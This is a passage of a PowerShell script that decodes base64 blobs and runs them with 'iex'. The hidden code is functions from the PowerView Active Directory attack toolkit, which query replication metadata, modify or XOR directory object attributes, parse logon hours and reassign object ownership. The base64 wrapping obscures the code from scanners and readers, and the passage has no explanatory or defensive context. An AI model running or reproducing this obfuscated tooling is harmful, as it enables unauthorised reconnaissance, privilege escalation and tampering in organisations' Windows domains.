mVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgewogICAgICAgICAgICAkUHJvcGVydHlGaWx0ZXIgPSAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSAtSm9pbiAnfCcKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRQcm9wZXJ0eUZpbHRlciA9ICcnCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snSWRlbnRpdHknXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkgfQogICAgICAgIEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkT2JqZWN0RE4gPSAkXy5Qcm9wZXJ0aWVzWydkaXN0aW5ndWlzaGVkbmFtZSddWzBdCiAgICAgICAgICAgIEZvckVhY2goJFhNTE5vZGUgaW4gJF8uUHJvcGVydGllc1snbXNkcy1yZXBsdmFsdWVtZXRhZGF0YSddKSB7CiAgICAgICAgICAgICAgICAkVGVtcE9iamVjdCA9IFt4bWxdJFhNTE5vZGUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSAnRFNfUkVQTF9WQUxVRV9NRVRBX0RBVEEnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICAgICBpZiAoJFRlbXBPYmplY3QpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFRlbXBPYmplY3QucHN6QXR0cmlidXRlTmFtZSAtTWF0Y2ggJFByb3BlcnR5RmlsdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0RE4nICRPYmplY3RETgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0F0dHJpYnV0ZU5hbWUnICRUZW1wT2JqZWN0LnBzekF0dHJpYnV0ZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdBdHRyaWJ1dGVWYWx1ZScgJFRlbXBPYmplY3QucHN6T2JqZWN0RG4KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdUaW1lQ3JlYXRlZCcgJFRlbXBPYmplY3QuZnRpbWVDcmVhdGVkCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnVGltZURlbGV0ZWQnICRUZW1wT2JqZWN0LmZ0aW1lRGVsZXRlZAogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0xhc3RPcmlnaW5hdGluZ0NoYW5nZScgJFRlbXBPYmplY3QuZnRpbWVMYXN0T3JpZ2luYXRpbmdDaGFuZ2UKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdWZXJzaW9uJyAkVGVtcE9iamVjdC5kd1ZlcnNpb24KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdMYXN0T3JpZ2luYXRpbmdEc2FETicgJFRlbXBPYmplY3QucHN6TGFzdE9yaWdpbmF0aW5nRHNhRE4KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQURPYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5JykKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0TGlua2VkQXR0cmlidXRlSGlzdG9yeV0gRXJyb3IgcmV0cmlldmluZyAnbXNkcy1yZXBsdmFsdWVtZXRhZGF0YScgZm9yICckT2JqZWN0RE4nIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gU2V0LURvbWFpbk9iamVjdCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VTaG91bGRQcm9jZXNzRm9yU3RhdGVDaGFuZ2luZ0Z1bmN0aW9ucycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1JlcGxhY2UnKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTZXQsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRYT1IsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENsZWFyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAeydSYXcnID0gJFRydWV9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CiAgICAgICAgJFJhd09iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkUmF3T2JqZWN0KSB7CiAgICAgICAgICAgICRFbnRyeSA9ICRSYXdPYmplY3QuR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgICAgICBpZigkUFNCb3VuZFBhcmFtZXRlcnNbJ1NldCddKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRQU0JvdW5kUGFyYW1ldGVyc1snU2V0J10uR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbU2V0LURvbWFpbk9iamVjdF0gU2V0dGluZyAnJCgkXy5OYW1lKScgdG8gJyQoJF8uVmFsdWUpJyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIgogICAgICAgICAgICAgICAgICAgICAgICAkRW50cnkucHV0KCRfLk5hbWUsICRfLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkRW50cnkuY29tbWl0Y2hhbmdlcygpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW1NldC1Eb21haW5PYmplY3RdIEVycm9yIHNldHRpbmcvcmVwbGFjaW5nIHByb3BlcnRpZXMgZm9yIG9iamVjdCAnJCgkUmF3T2JqZWN0LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpJyA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRQU0JvdW5kUGFyYW1ldGVyc1snWE9SJ10pIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFBTQm91bmRQYXJhbWV0ZXJzWydYT1InXS5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eU5hbWUgPSAkXy5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eVhvclZhbHVlID0gJF8uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5PYmplY3RdIFhPUmluZyAnJFByb3BlcnR5TmFtZScgd2l0aCAnJFByb3BlcnR5WG9yVmFsdWUnIGZvciBvYmplY3QgJyQoJFJhd09iamVjdC5Qcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKSciCiAgICAgICAgICAgICAgICAgICAgICAgICRUeXBlTmFtZSA9ICRFbnRyeS4kUHJvcGVydHlOYW1lWzBdLkdldFR5cGUoKS5uYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0eVZhbHVlID0gJCgkRW50cnkuJFByb3BlcnR5TmFtZSkgLWJ4b3IgJFByb3BlcnR5WG9yVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgJEVudHJ5LiRQcm9wZXJ0eU5hbWUgPSAkUHJvcGVydHlWYWx1ZSAtYXMgJFR5cGVOYW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5jb21taXRjaGFuZ2VzKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdF0gRXJyb3IgWE9SJ2luZyBwcm9wZXJ0aWVzIGZvciBvYmplY3QgJyQoJFJhd09iamVjdC5Qcm9wZXJ0aWVzLnNhbWFjY291bnRuYW1lKScgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkUFNCb3VuZFBhcmFtZXRlcnNbJ0NsZWFyJ10pIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFBTQm91bmRQYXJhbWV0ZXJzWydDbGVhciddIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydHlOYW1lID0gJF8KICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5PYmplY3RdIENsZWFyaW5nICckUHJvcGVydHlOYW1lJyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIgogICAgICAgICAgICAgICAgICAgICAgICAkRW50cnkuJFByb3BlcnR5TmFtZS5jbGVhcigpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRFbnRyeS5jb21taXRjaGFuZ2VzKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpbk9iamVjdF0gRXJyb3IgY2xlYXJpbmcgcHJvcGVydGllcyBmb3Igb2JqZWN0ICckKCRSYXdPYmplY3QuUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZSknIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydEZyb20tTERBUExvZ29uSG91cnMgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkxvZ29uSG91cnMnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlciggVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtieXRlW11dCiAgICAgICAgJExvZ29uSG91cnNBcnJheQogICAgKQogICAgQmVnaW4gewogICAgICAgIGlmKCRMb2dvbkhvdXJzQXJyYXkuQ291bnQgLW5lIDIxKSB7CiAgICAgICAgICAgIHRocm93ICJMb2dvbkhvdXJzQXJyYXkgaXMgdGhlIGluY29ycmVjdCBsZW5ndGgiCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbaW50W11dCiAgICAgICAgICAgICAgICAkSG91cnNBcnIKICAgICAgICAgICAgKQogICAgICAgICAgICAkTG9nb25Ib3VycyA9IE5ldy1PYmplY3QgYm9vbFtdIDI0CiAgICAgICAgICAgIGZvcigkaT0wOyAkaSAtbHQgMzsgJGkrKykgewogICAgICAgICAgICAgICAgJEJ5dGUgPSAkSG91cnNBcnJbJGldCiAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJGkgKiA4CiAgICAgICAgICAgICAgICAkU3RyID0gW0NvbnZlcnRdOjpUb1N0cmluZygkQnl0ZSwyKS5QYWRMZWZ0KDgsJzAnKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCswXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzddKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCsxXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzZdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCsyXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzVdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCszXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzRdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs0XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzNdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs1XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzJdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs2XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzFdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs3XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzBdKQogICAgICAgICAgICB9CiAgICAgICAgICAgICRMb2dvbkhvdXJzCiAgICAgICAgfQogICAgfQogICAgUHJvY2VzcyB7CiAgICAgICAgJE91dHB1dCA9IEB7CiAgICAgICAgICAgIFN1bmRheSA9IENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgLUhvdXJzQXJyICRMb2dvbkhvdXJzQXJyYXlbMC4uMl0KICAgICAgICAgICAgTW9uZGF5ID0gQ29udmVydFRvLUxvZ29uSG91cnNBcnJheSAtSG91cnNBcnIgJExvZ29uSG91cnNBcnJheVszLi41XQogICAgICAgICAgICBUdWVzZGF5ID0gQ29udmVydFRvLUxvZ29uSG91cnNBcnJheSAtSG91cnNBcnIgJExvZ29uSG91cnNBcnJheVs2Li44XQogICAgICAgICAgICBXZWRuZXNkYXkgPSBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IC1Ib3Vyc0FyciAkTG9nb25Ib3Vyc0FycmF5WzkuLjExXQogICAgICAgICAgICBUaHVycyA9IENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgLUhvdXJzQXJyICRMb2dvbkhvdXJzQXJyYXlbMTIuLjE0XQogICAgICAgICAgICBGcmlkYXkgPSBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IC1Ib3Vyc0FyciAkTG9nb25Ib3Vyc0FycmF5WzE1Li4xN10KICAgICAgICAgICAgU2F0dXJkYXkgPSBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IC1Ib3Vyc0FyciAkTG9nb25Ib3Vyc0FycmF5WzE4Li4yMF0KICAgICAgICB9CiAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5ICRPdXRwdXQKICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2dvbkhvdXJzJykKICAgICAgICAkT3V0cHV0CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gU2V0LURvbWFpbk9iamVjdE93bmVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ093bmVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3duZXJJZGVudGl0eSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZX